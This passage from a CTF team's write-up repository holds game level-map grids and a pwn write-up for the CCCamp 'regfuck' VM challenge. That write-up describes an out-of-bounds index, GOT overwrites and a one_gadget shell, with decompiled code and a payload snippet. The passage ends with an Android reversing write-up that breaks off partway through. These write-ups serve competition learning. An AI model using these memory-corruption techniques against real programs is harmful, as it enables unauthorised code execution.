000111000001110000011100000111000001110000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000b111111k00000b1k00000b1k00000b1k00000b1k00000b1k0000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000x0000x0000000x0000000x0000000x0000000x0000000x00000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000x0000x0000000x0000000x0000000x0000000x0000000x00001110000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000x0000x0000000x0000000x0000000x0000000x0000000x0000b1k0000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000x0000x0000000x0000000x0000000x0000000x0000000x00000x00000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000x0000x000000111000001110000011100000111000001110000x00000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000x0000x000000b1k00000b1k00000b1k00000b1k00000b1k0000x00000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000x000111110000x0000000x0000000x0000000x0000000x00000x00000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000x000aA1lL0000x0000000x0000000x0000000x0000000x00000x00000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000x00000x000000x0000000x0000000x0000000x0000000x00000x00000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", "timestamp": "2025-10-24T11:39:28.693371"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-06-22-Google-CTF-Quals/files/flaggybird-level2.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-06-22-Google-CTF-Quals/files/flaggybird-level2.txt", "content": "1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x000000000000000000000000000000000000000x000000x0000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x000000000000000000000000000000000000000x000000x0000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x000000000000000000000000000000000000000x000000x0000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x000000000000000000000000000000000000000x000000x0000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x004000000000000000000000000000000000000x000000x0000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000000000000011111111111111111111111111111111111111111000000x0000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x00000000x0000000x000000x0000000x00000000000000x0000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x00000000x0000000x000000x0000000x0000000000000110000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x00000000x0000000x000000x0000000x0000000000011lL0000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x00000000x00Ggg00x000000x0000000x00000000011lL000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x00000000x00lLL00x000000x0000000x000000011lL00000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x00000001100000001100000x00Ggg00x0000011lL0000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x0000011lL0000000aA11000x00lLL00x00011lL000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x00011lL00000000000aA110x0000000x011lL00000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111110000000000000x011lL000000000000000aA11000000011lL0000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000000000000011lL000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000001111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", "timestamp": "2025-10-24T11:39:28.858802"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-06-22-Google-CTF-Quals/files/flaggybird-level3.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-06-22-Google-CTF-Quals/files/flaggybird-level3.txt", "content": "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000e111111h0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n000000000000000000000000000000000000000000000e1lL00aA1h000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n00000000000000000000000000000000000000000000e1k000000b1h00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000e1J00000000c1h0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n000000000000000000000000000000000000000000e11j00000000C11h000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n000000000e1h000e1h000e1h000e1h000e1h0000Ff11k0000000000b11Gg0000e1h000e1h000e1h000e1h000e1h000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111111111111111111111111111111111111lL000000000000aA111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111111lL0x0000000x000000x000000x00000000030000000000x000000x000000x0000000x0aA11111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111k000x0000000x000000x000000x00000000111100000000x000000x000000x0000000x000b1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111111k0000x0000000x000000x000000x00000000000000000000x000000x000000x0000000x0000b111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111J00000x0000000x000000x000000x00000000000000000000x000000x000000x0000000x00000c11111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111j00000x0000000x000000x000000x00001100000000110000x000000x000000x0000000x00000C11111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000000x0000000x000000x000000x00000000000000000000x000000x000000x0000000x00000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000000x0000020x020020x020020x02002000200200020020x020020x020020x0200000x00000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000000x0000011111001111100111110011111001111100111110011111001111100000x00000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000011111000aA1lL00aA1lL00aA1lL00aA1lL00aA1lL00aA1lL00aA1lL00aA1lL00011111000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000000x0000000100000010000001000000100000010000001000000100000010000000x00000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000000x0000000100000010000001000000J00000010000001000000c00000010000000x00000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111110000x0000000c0000001000000c000000j00000010000001000000C000000J0000000x00001111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000000x0000000C000000J000000C0000000000000c000000J0000000000000j0000000x00000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111000000x00000000000000j00000000000000000000C000000j000000000000000000000x00000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100001111100000000000000000000000000000000000000000000000000000000000011111000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000011111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111g000000000200020020002002000200200020020002002000200200020020002000000000F1111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111111111g00000011111100111110011111001111100111110011111001111100111111000000F111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111111111g00000aA1lL00aA1lL00aA1lL00aA1lL00aA1lL00aA1lL00aA1lL00aA1lL00000F11111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111g00000J000000100000010000001000000100000010000001000000c00000F1111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111111111111111g000j000000c00000010000001000000100000010000001000000C000F111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111111111111111g00000000C0000001000000100000010000001000000J00000000F11111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111g0000000000000J00000010000001000000c000000j000000F1111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111111111111111111111g00000000000j0000001000000J000000C00000000000F111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111111111111111111111g00000000000000001000000j0000000000000000F11111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111g00000000000000c000000000000000000000F1111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111111111111111111111111111g000000000000C0000000000000000000F111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111111111111111111111111111g0000000000000000000000000000F11111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111g000000000000000000000000F1111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n111111111111111111111111111111111111111g00000000000000000000F111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n11111111111111111111111111111111111111111g0000000000000000F11111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", "timestamp": "2025-10-24T11:39:29.056374"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-08-23-CCCamp/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-08-23-CCCamp/README.md", "content": "## 320 Pwn / regfuck\n\n### Overview\n\nIn this challenge, a small virtual machine engine is provided and we need get the shell by providing the virtual machine metadata and byte-codes. The vulnerability I exploited is an OOB access by moving index to `got` table and changing function pointer stored in `got` table to `one_gadget`. We cannot write to `got` table directly but can only increment and decrement the value, so the idea is to increment or decrement a constant offset. However, since functions imported in this binary are quite far from `one_gadget`, and the problem is program counter is only an `int16_t`, so maximum size of program is not enough to increment or decrement the constant offset as large as that. The idea is to re-execute the main function to increment or decrement for several times so that we can reach desired pointer.\n\n### Reverse Engineering\n\nThis binary is not hard to reverse. The only point to note is that the `switch` statement of the instruction execution is not well identified by IDA, so we need to patch the binary a bit to enable IDA to identify it properly.\n\nOriginally `0x402008`, which the address of switch table, stores the offsets of switch blocks to `0x402008`, but I patched it to the 8-byte addresses of these blocks directly by using IDA Python. Then I also patched the switch instructions to `jmp ds:off_402008[rax*8]` by using `keypatch`, so that switch statement can be identified. Also, `Edit->Other->Specify switch idiom` can be used to modify the switch statement.\n\nAlso, the way to parse opcode of this virtual machine is a bit interesting. The VM code is not byte-wise but bit-wise, with the highest bit of the byte being the first bit of this byte. Opcode is a sequence of `1` separated by a `0`, and different number of `1` specifies different instruction.\n\n```c\n__int64 __fastcall exec_ins(_DWORD *data, char *input, _WORD *pc, __int16 *idx, int prelen)\n{\n  __int16 dref_pc; // ax\n  __int16 v6; // dx\n  _DWORD *v8; // rax\n  _DWORD *v9; // rax\n  __int16 *pc_; // [rsp+18h] [rbp-18h]\n\n  pc_ = pc;\n  dref_pc = *pc;\n  v6 = *pc + 7;\n  if ( dref_pc < 0 )\n    dref_pc = v6;\n  if ( (input[(signed __int16)(dref_pc >> 3)] >> (7 - (unsigned __int16)(*pc_ % 8))) & 1 )\n  {\n    ++*data;\n  }\n  else\n  {\n    switch ( *data )\n    {\n      case 1:\n        if ( *idx == prelen - 1 )\n          return 1LL;\n        ++*idx;\n        break;\n        return 1LL;\n      case 2:\n        if ( *idx == -1 )\n          return 1LL;\n        --*idx;\n        break;\n        return 1LL;\n      case 3:\n        v8 = &data[*idx + 2LL];\n        ++*v8;\n        break;\n      case 4:\n        v9 = &data[*idx + 2LL];\n        --*v9;\n        break;\n      case 5:\n        if ( data[*idx + 2LL] )\n          *pc_ = data[1] >> 16;\n        break;\n      case 6:\n        data[1] = data[*idx + 2LL];\n        break;\n      case 7:\n        putchar(data[*idx + 2LL]);\n        break;\n      case 8:\n        data[*idx + 2LL] = (*pc_ << 16) | (unsigned __int16)*idx;\n        break;\n      case 9:\n        if ( data[*idx + 2LL] )\n          *idx = data[1];\n        break;\n      default:\n        break;\n    }\n    *data = 0;\n  }\n  return 0LL;\n}\n```\n\n### Vulnerability\n\nThere are actually many bugs in this binary, such as integer overflows. However, I only used the one that sets `*idx` to an OOB value.\n\n```c\ncase 2:\n  if ( *idx == -1 )\n     return 1LL;\n  --*idx; // *idx can be -1\n  break;\ncase 4:\n  v9 = &data[*idx + 2LL];\n  --*v9; // data[1] can be changed\n  break;\ncase 9:\n  if ( data[*idx + 2LL] )\n    *idx = data[1]; // set *idx without checking\n```\n\nTherefore by using this payload, we can switch `*idx` to `got` table.\n\n```python\nidx = -((p.got[\"exit\"] - 0x405000) / 4 - 2)\nins(2) # idx = -1\nfor i in xrange(idx):\n\tins(4) # data[1] = (p.got[\"exit\"] - 0x405000) / 4 - 2\nins(9)\n```\n\n### Exploitation\n\nAs I suggested, we cannot change the a constant offset directly. I have considered many approaches but finally I found this one that works. The idea is to change `putchar` to main function so that we can re-enter VM codes and execute for the many times. However, the problem is `mmap` now will return create a new page at `0x7fxxxxxxxxxx` since `0x405000` has already been used, so we cannot switch to `got` table as before. Therefore, we want to change pointer in `mmap` `got` entry to somewhere that returns `0x405000`.\n\n```assembly\nadd     rax, rcx\nmov     r9d, 0          ; offset\nmov     r8d, 0FFFFFFFFh ; fd\nmov     ecx, 22h        ; flags\nmov     edx, 3          ; prot\nmov     rsi, rax        ; len\nmov     edi, 405000h    ; addr\ncall    _mmap\n```\n\nInitially I want to find a gadget like `mov rax,rdi; ret`, but such gadget is too far from `mmap` function. However, since we can control the second argument, which is equal to `rax`, we can just let `mmap` to be a `ret` instruction and crafting its return value by ourselves. A point to note about this is that the `read` function later on uses this value as the size. Even if this value is larger than mapped memory, it can still work. Since the `read` is replaced by a custom `read`, it will continue to call original `read` until error occurs, which will occurs if `read(0, unmapped_memory, xxx)` is called.\n\nAlso, we need to choose a `got` table entry to rewrite to `one_gadget`. I choose `puts`, since it is only called once, and we can skip this function when we jump back to main function to avoid any crash, and fortunately by debugging I found this can satisfy the `[rsp+0x40]` `one_gadget` condition.\n\nThe final exploit is [here](exp.py), although a bit ugly.\n\n", "timestamp": "2025-10-24T11:39:30.300172"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2020-08-22-Google-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2020-08-22-Google-CTF/README.md", "content": "# 2020-08-22-Google-CTF #\n\n[CTFTime link](https://ctftime.org/event/1041) | [Website](https://capturetheflag.withgoogle.com/)\n\n---\n\n## Challenges ##\n\nNote: incomplete listing.\n\n### reversing ###\n\n - [x] [94 android](#94-reversing--android)\n - [x] [173 sprint](#173-reversing--sprint)\n\n---\n\n## 94 reversing / android ##\n\n**Description**\n\n> Can you find the correct key to unlock this app?\n\n**Files provided**\n\n - [android](https://storage.googleapis.com/gctf-2020-attachments-project/91b17683f3f2b06b679d729a5b5279cdbdfea7607546ac34c1f7114add7e4a0970410d22d359d09055f8fa7d6efe20b4b3f4be67ed5d7a5257fc4117175848c8)\n\n**Solution** (by [Aurel300](https://github.com/Aurel300))\n\nWe are given an Android APK. There is a text box that will verify our flag, and a button. Not much to see there!\n\nWe can try to decompile it with a tool such as JADX (available online e.g. [here](http://www.javadecompilers.com/apk/)). Unfortunately, the method we really need to see, the button click handler, fails to decompile. JADX complains about `long` not being a class type. The main class also contains a field called `class`, and a field with a weird, single-letter Unicode name, both of which probably hinder decompilation, although JADX handles these issues well (by renaming the fields and telling us about it).\n\nThe one method of interest that is decompiled successfully is hidden in the `R` class, which typically holds many uninteresting (automatically-generated) constants, usually related to the layout of elements on screen. The method is:\n\n```java\npublic static long[] m0(long a, long b) {\n  if (a == 0) {\n    return new long[]{0, 1};\n  }\n  long[] r = m0(b % a, a);\n  return new long[]{r[1] - ((b / a) * r[0]), r[0]};\n}\n```\n\nWe will return to this method later. If we can't see the decompiled code for the interesting parts, we can at least see the bytecode. By unzipping the `apk` like a regular Zip archive, we can find `classes.dex`. Using [`dex2jar`](https://github.com/pxb1988/dex2jar), this file can be converted into individual `.class` files containing Java bytecode. The two files of interest are the strangely-named ones. On a Mac machine, they display as `+%E6.class` and `+%E6$1.class`, which may refer to the Unicode character `æ` (codepoint `U+00E6`). However, JADX seemed to report the class name as `ő` (codepoint `U+0151`), which is what we'll use as well.\n\nThe Java JDK is bundled with a tool called `javap` that lets us dump the bytecode in a human-readable format:\n\n```bash\n$ javap -c '+%E6'\n$ javap -c '+%E6$1'\n```\n\nBut even here, we face some issues! `dex2jar`, even the latest version, produces `.class` files for us, but they contain stubs instead of the real bytecode:\n\n```\nString d2j fail translate: java.lang.NullPointerException\n  at java.lang.String.<init>(String.java:204)\n  at org.objectweb.asm.Type.getInternalName(Type.java:580)\n  at com.googlecode.d2j.converter.IR2JConverter.toInternal(IR2JConverter.java:97)\n  ... (etc etc)\n```\n\nFortunately, it also produces an error report which shows what we need to see:\n\n - [Bytecode of `ő.<init>` (static initialisation code).](files/android-bytecode-1.txt)\n - [Bytecode of `ő.<inner class>.onClick` (click event handler).](files/android-bytecode-2.txt)\n\n### Static initialiser\n\nThe first method is not terribly interesting, except for the [array data](files/android-bytecode-1.txt#L29-L40):\n\n```\n    107t -104t 113t 2t 0t 0t 0t 0t\n    -55t 57t 66t -90t 0t 0t 0t 0t\n    75t -19t 29t 39t 0t 0t 0t 0t\n    67t 97t 24t 1t 0t 0t 0t 0t\n    -97t 34t -6t -64t 0t 0t 0t 0t\n    -65t 16t 14t 105t 0t 0t 0t 0t\n    87t -94t -36t 40t 0t 0t 0t 0t\n    -47t -103t -58t 22t 0t 0t 0t 0t\n    -3t 111t -91t 85t 0t 0t 0t 0t\n    -95t 112t -72t 126t 0t 0t 0t 0t\n    -97t 121t -55t -59t 0t 0t 0t 0t\n    101t -114t -125t 47t 0t 0t 0t 0t\n```\n\nWe can decode this into 12 integers (each number is a single byte, MSB-to-LSB left-to-right):\n\n```\n0x0271986B\n0xA64239C9\n0x271DED4B\n0x01186143\n0xC0FA229F\n0x690E10BF\n0x28DCA257\n0x16C699D1\n0x55A56FFD\n0x7EB870A1\n0xC5C9799F\n0x2F838E65\n```\n\nInteresting, but not at all the flag we are after.\n\n### Click handler\n\nThe click event handler method is much longer, although most of it is due to a section [initialising an array byte by byte](files/android-bytecode-2.txt#L28-L244). We can take the bytecode and do some text replacement magic to get [the equivalent Python code](scripts/android-bytes.py). The result after all that work is:\n\n```\nApparently this is not the flag. What's going on?\n```\n\nSo, not the flag! Strangely, it would seem from the bytecode dump that the method can only ever execute the part that outputs the fake flag. From the beginning, we unconditionally enter the section:\n\n```\n    const/16 v2, 49\n    const/4 v3, 0\n    const/4 v4, 3\n    const/4 v5, 2\n    const/4 v6, 1\n    const/4 v7, 4\n    goto :L2\n```\n\n[`L2`](files/android-bytecode-2.txt#L28-L244) initialises the bytes of the fake flag, [`L3`](files/android-bytecode-2.txt#L246-L254) converts them to a string, [`L4`](files/android-bytecode-2.txt#L256-L265) displays them and compares them to the user output. Here we have a branch that goes to either the [end of `L4`](files/android-bytecode-2.txt#L266-L269) or [`L5`](files/android-bytecode-2.txt#L271-L273), displaying the Unicode characters `🚩` (success!) and `❌` (failure), respectively. Then both go to [`L6`](files/android-bytecode-2.txt#L275), then [`L13`](files/android-bytecode-2.txt#L388), and then the method returns.\n\nBut there are still large parts of the method that we haven't gone through at all. There are also a number of exception handlers listed:\n\n```\n  .catch Ljava/lang/Exception; { :L1 .. :L6 } :L0\n  .catch Ljava/lang/Error; { :L1 .. :L6 } :L0\n  .catch J { :L1 .. :L6 } :L0\n  .catch Ljava/lang/Exception; { :L7 .. :L14 } :L0\n```\n\nAs an aside here – the third exception handler handles exceptions of type `J`, which is Java mangling for the `long` type. `try { ... } catch (long e) { ... }` is invalid Java code, because the exception type should be a class type. This is also what JADX complained about during decompilation. It may be semantically invalid bytecode, but it seems to pass verification (at least in its Dalvik/DEX form) and it throws off decompilers.\n\n[One of the calls](files/android-bytecode-2.txt#L249) in the method subtly causes an exception to be thrown, which is then \"handled\" by `L0`:\n\n```\n    check-cast v9, Ljava/lang/Character;\n```\n\nAlthough `int` can be cast into a `char`, `Integer` cannot be cast to a `Character` (it throws a `ClassCastException`)! We can just assume we got to `L0` then, and see where that leads us.\n\nAt `L0`, we get code very similar to the beginning of the method. Same constants, but leading elsewhere:\n\n```\n  :L0\n    const/16 v2, 49\n    const/4 v3, 0\n    const/4 v4, 3\n    const/4 v5, 2\n    const/4 v6, 1\n    const/4 v7, 4\n    goto/16 :L7\n```\n\nAt [`L7`](files/android-bytecode-2.txt#L277-L289):\n\n```\n  :L7\n    iget-object v3, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$editText:Landroid/widget/EditText;\n    invoke-virtual { v3 }, Landroid/widget/EditText;->getText()Landroid/text/Editable;\n    move-result-object v3\n    invoke-virtual { v3 }, Ljava/lang/Object;->toString()Ljava/lang/String;\n    move-result-object v3\n    invoke-virtual { v3 }, Ljava/lang/String;->length()I\n    move-result v5\n    const/16 v6, 48\n    if-eq v5, v6, :L8\n    iget-object v4, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$textView:Landroid/widget/TextView;\n    const-string v5, \"\\u274c\"\n    invoke-virtual { v4, v5 }, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n    return-void\n```\n\nWe read the user input from the `android.widget.EditText` object. The length of that string is checked. 